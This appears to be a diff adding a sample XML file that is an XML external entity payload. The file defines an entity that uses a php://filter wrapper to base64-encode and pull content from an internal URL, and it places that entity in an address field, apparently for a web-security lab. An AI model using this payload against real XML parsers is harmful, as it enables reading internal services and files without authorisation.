@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE foo [
+<!ENTITY schedule SYSTEM "php://filter/read=convert.base64-encode/resource=http://internal.example.jp/">
+]>
+<user>
+  <name>徳丸浩</name>
+  <address>&schedule;</address>
+</user>
